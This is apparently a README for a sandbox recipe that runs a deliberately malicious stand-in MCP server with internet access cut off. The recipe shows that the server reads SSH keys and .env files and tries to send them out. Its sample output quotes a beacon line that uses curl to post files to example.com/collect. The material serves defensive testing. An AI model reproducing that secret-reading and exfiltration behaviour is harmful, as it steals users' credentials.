# Quarantine an untrusted MCP server

Before you plug a third-party MCP server into your agent, run it somewhere it cannot hurt you. This
recipe starts an untrusted server inside a NeevCloud sandbox with outbound internet access denied,
connects an MCP client to it, calls its one tool, and then shows what the server did behind that
answer: the data it tried to send out and could not, the local secrets it read, and the background
process it left running.

The server shipped here (`untrusted_server.py`) is a deliberate stand-in for a malicious one. Its
`summarize_text` tool returns a harmless summary, but on the way it reads `~/.ssh/id_rsa` and a
`.env`, tries to POST them to an outside host, and spawns a looping background beacon. The recipe
plants only dummy secrets, and the sandbox's denied egress is what actually stops anything leaving,
so running it is safe.

<p align="center">
  <img src="../../assets/runs/quarantine-mcp-server-python.gif" alt="A real run of this recipe, recorded in a terminal" width="720">
</p>

## What you need

- Python 3.11 or later
- A NeevCloud account with one API key from **Account > API Keys** ([how to create one](https://docs.ai.neevcloud.com/getting-started/create-api-key)) with Resource Type **Sandboxes**
  (`NEEV_API_KEY`)
- Your [organization and project IDs](https://docs.ai.neevcloud.com/getting-started/org-and-project) (`NEEV_ORG_ID`, `NEEV_PROJECT_ID`)

No model API key is needed: the server and client here are fixed, so no language model is involved.

## Run it

```bash
python3.12 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
export NEEV_API_KEY=... NEEV_ORG_ID=... NEEV_PROJECT_ID=...
python quarantine.py
```

On Windows, see the [setup guide](../../docs/setup.md#windows) for the PowerShell commands.

The MCP package and the untrusted server never run on your machine. The script installs the package
inside the sandbox, then cuts off the sandbox's internet before the server runs. The script exits `0`
only when the outbound exfiltration was blocked and both suspicious behaviours — the secret reads and
the spawned process — were seen.

## What you see

```
1. Creating a sandbox that can reach only the package index...
2. Installing the MCP package inside the sandbox...
3. Cutting off all internet access before the untrusted server runs...
4. Planting dummy secrets and uploading the untrusted server...
5. Connecting an MCP client to the untrusted server and calling summarize_text...
   Tools offered: summarize_text
   Tool answer: 14 words. Gist: NeevCloud sandboxes run untrusted code with egress you control and a command...
6. Looking at what the server did behind that harmless answer:
   Outbound POST to example.com: exit 28, 0 bytes uploaded, http 000
   Outbound POST to the package index (reachable before lockdown): exit 28, 0 bytes uploaded, http 000
   The server's own exfil attempt reported: URLError: <urlopen error [Errno -3] Temporary failure in name resolution>
   Secret read, by the server's own record: /root/.ssh/id_rsa (208 bytes)
   Secret read, by the server's own record: /workspace/.env (171 bytes)
   Background process still running: 27 sh -c : QUARANTINE_BEACON_TAG; ... curl ... --data-binary @"$f" ... https://example.com/collect ...
7. Audit trail (program and target only; never the arguments or any stolen bytes):
   exec curl -> success
   exec python3 -> success
   fs.write - harness.py -> success
   fs.write - untrusted_server.py -> success
   fs.write - .env -> success
   exec sh -> success
   exec python3 -> success
Verdict:
   [PASS] exfiltration was blocked: example.com and the package index are both unreachable
   [PASS] the server's secret reads were seen (from its own record)
   [PASS] the background process the server spawned was detected in the process list
The quarantine held: the untrusted server was contained and its moves were seen.
   Sandbox deleted.
```

`example.com` stands in for an attacker's collection endpoint. The script probes two hosts: that one,
and the package index that *was* reachable while the MCP package installed. After the lockdown both
are unreachable — curl uploads 0 bytes and gets no HTTP response — which is what proves the
internet was really cut off and not merely that one name failed to resolve.

## How it works

The script holds the lifecycle and the network policy; the untrusted server only ever runs where it
has been cut off from the internet.

1. `client.sandboxes.create({...}, allow_egress=["pypi.org", "files.pythonhosted.org"])` starts an
   isolated Linux machine that can reach only the package index, so the MCP package can be installed.
2. `sandbox.exec(["python3", "-m", "pip", "install", ... "mcp>=2.3,<3"])` installs the MCP package
   inside the sandbox. It is never installed on your machine.
3. `sandbox.update({"egress": {"mode": "deny_all"}})` removes all internet access before the
   untrusted server runs. Everything after this point happens with no internet access.
4. `sandbox.files.write(...)` uploads the untrusted server and a small MCP client, and plants dummy
   secrets. Then `sandbox.exec(["python3", "harness.py"])` runs the client inside the sandbox: it
   opens an MCP session to the untrusted server over stdio, lists its tools, and calls
   `summarize_text` once — exactly as your agent would, but somewhere safe.
5. The script then inspects the sandbox from the outside with the SDK. Two `curl` probes — one to the
   exfiltration host, one to the package index that was reachable a moment ago — both come back with
   0 bytes and no response, proving the lockdown took hold. `ps` shows the background beacon still
   running. `sandbox.audit(...)` shows the command trail records only the program and target, never
   the arguments or the bytes. The secret reads come from the server's own record.

`sandbox.delete()` runs in a `finally` block, so the sandbox is removed even if a step fails or you
press `Ctrl+C`.

One thing worth understanding: the audit trail records operations made through the sandbox runtime,
not every system call a process inside makes. The server's own file reads and its socket attempts do
not show up there. That is why denied egress, not logging, is what keeps the data in — the trail
tells you what ran, and the network policy makes sure nothing it stole could leave.

## Time and cost

Typically under a minute end to end; most of it is installing the MCP package. You pay for the
sandbox for that minute and nothing else — there is no model call.

## Cleanup

The sandbox and everything in it, including the beacon, are deleted when the script ends, fails or
you press `Ctrl+C`. If the process is killed outright, delete any leftover `quarantine-` sandbox from
the console.
